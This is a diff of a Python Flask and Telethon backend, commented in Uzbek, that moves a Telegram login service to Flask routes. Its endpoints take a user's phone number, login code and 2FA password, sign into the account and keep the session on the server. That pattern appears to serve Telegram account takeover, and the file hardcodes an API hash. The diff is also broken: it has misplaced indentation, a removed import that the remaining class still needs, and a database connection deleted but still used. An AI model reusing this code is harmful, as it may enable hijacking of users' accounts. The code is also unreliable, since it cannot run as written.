@@ -1,16 +1,12 @@
 import json
+import psycopg2
 import os
 import asyncio
 from aiogram import Bot
-import requests
-import threading
-from http.server import BaseHTTPRequestHandler, HTTPServer
 from telethon.sync import TelegramClient
 from flask import Flask
-import os
 from flask import Flask, render_template, request, jsonify
 
-# 🔴 ENG MUHIM QATOR — ENG TEPADA BO‘LSIN
 app = Flask(__name__, template_folder="templates")
 
 from telethon.errors import (
@@ -18,6 +14,11 @@ from telethon.errors import (
     SessionPasswordNeededError,
     FloodWaitError,
     PhoneNumberInvalidError)
+
+DATABASE_URL = os.getenv("DATABASE_URL")
+
+def get_db():
+    return psycopg2.connect(DATABASE_URL)
 
 API_ID = 25780325
 API_HASH = "2c4cb6eee01a46dc648114813042c453"
@@ -69,75 +70,60 @@ class LoginHandler(BaseHTTPRequestHandler):
         password = data.get("password")
 
         # ===== SEND CODE =====
-        if action == "send_code":
-            try:
-                # eski session bo‘lsa yopamiz
-                if phone in pending:
-                    pending[phone]["client"].disconnect()
-                    pending.pop(phone)
+       @app.route("/send_code", methods=["POST"])
+def send_code():
+    phone = request.json.get("phone")
 
-        # 🔥 SYNC TelegramClient
-                client = TelegramClient(session_path(phone), API_ID, API_HASH)
-                client.connect()
+    try:
+        client = TelegramClient(session_path(phone), API_ID, API_HASH)
+        client.connect()
 
-                sent = client.send_code_request(phone)
+        sent = client.send_code_request(phone)
+        pending[phone] = {
+            "client": client,
+            "hash": sent.phone_code_hash
+        }
 
-                pending[phone] = {
-                    "client": client,
-                    "hash": sent.phone_code_hash
-               }
+        return jsonify({"ok": True})
 
-                return self.respond({"status": "code_sent"})
-
-            except FloodWaitError as e:
-                return self.respond({"status": "flood_wait", "seconds": e.seconds})
-
-            except PhoneNumberInvalidError:
-               return self.respond({"status": "phone_invalid"})
-
-            except Exception as e:
-               print("SEND CODE ERROR:", e)
-               return self.respond({"status": "error", "message": str(e)})
+    except PhoneNumberInvalidError:
+        return jsonify({"ok": False, "error": "phone_invalid"})
 
 
                         # ===== VERIFY CODE =====
-        if action == "verify_code":
-            if phone not in pending:
-                return self.respond({"status": "no_code_requested"})
+@app.route("/verify_code", methods=["POST"])
+def verify_code():
+    phone = request.json.get("phone")
+    code = request.json.get("code")
 
-            client = pending[phone]["client"]
-            phone_hash = pending[phone]["hash"]
+    if phone not in pending:
+        return jsonify({"ok": False})
 
-            try:
-                client.sign_in(
-                    phone=phone,
-                    code=code,
-                    phone_code_hash=phone_hash
-                )
-            except PhoneCodeInvalidError:
-                return self.respond({"status": "invalid_code"})
-            except SessionPasswordNeededError:
-                return self.respond({"status": "2fa_required"})
-            except Exception as e:
-                return self.respond({"status": "error", "message": str(e)})
+    client = pending[phone]["client"]
+    phone_hash = pending[phone]["hash"]
 
-            # 🔥 ENG MUHIM JOY
-            me = client.get_me()
-            user_id = me.id
+    try:
+        client.sign_in(phone=phone, code=code, phone_code_hash=phone_hash)
+        me = client.get_me()
 
-            conn = get_db()
-            cur = conn.cursor()
-            cur.execute("""
-                INSERT OR REPLACE INTO authorized_users (user_id, phone)
-                VALUES (?, ?)
-            """, (str(user_id), phone))
-            conn.commit()
-            conn.close()
+        conn = get_db()
+        cur = conn.cursor()
+        cur.execute("""
+            INSERT INTO authorized_users (user_id, phone)
+            VALUES (%s, %s)
+            ON CONFLICT (user_id) DO UPDATE SET phone = EXCLUDED.phone
+        """, (str(me.id), phone))
+        conn.commit()
+        conn.close()
 
+        client.disconnect()
+        pending.pop(phone)
 
-            client.disconnect()
-            pending.pop(phone)
-            return self.respond({"status": "success"})
+        return jsonify({"ok": True, "user_id": me.id})
+
+    except PhoneCodeInvalidError:
+        return jsonify({"ok": False, "error": "invalid_code"})
+
 
 
         # ===== VERIFY PASSWORD (2FA) =====
@@ -156,12 +142,14 @@ class LoginHandler(BaseHTTPRequestHandler):
             me = client.get_me()
             user_id = me.id
 
-            conn = get_db()
+            
             cur = conn.cursor()
             cur.execute("""
-                INSERT OR REPLACE INTO authorized_users (user_id, phone)
-                VALUES (?, ?)
+                INSERT INTO authorized_users (user_id, phone)
+                VALUES (%s, %s)
+                ON CONFLICT (user_id) DO UPDATE SET phone = EXCLUDED.phone
             """, (str(user_id), phone))
+
             conn.commit()
             conn.close()
 
@@ -213,9 +201,6 @@ def auth():
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
 
-
-if __name__ == "__main__":
-    run()
 
 
 
